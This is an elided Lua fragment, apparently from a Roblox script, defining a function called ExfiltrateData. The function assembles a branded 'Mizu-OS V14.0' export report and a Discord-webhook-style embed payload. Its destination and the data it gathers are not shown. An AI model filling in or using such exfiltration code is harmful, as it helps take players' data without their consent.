...
local function ExfiltrateData()
    ...
    task.spawn(function()
        local lines = {}
        table.insert(lines, "-- ╔════════════════════════════════════════════════════════════════╗")
        table.insert(lines, "-- ║ 👑 MIZUKAGE V14.0 OMNISCIENT - OFFICIAL EXPORT REPORT")
        ...
        local EmbedData = {
            ["username"] = "Mizu-OS Intelligence",
            ["avatar_url"] = CachedData.AvatarURL,
            ...
            ["embeds"] = {{
                ...
                ["footer"] = { 
                    ["text"] = "Mizu-OS V14.0 • The Omniscient Engine" 
                },
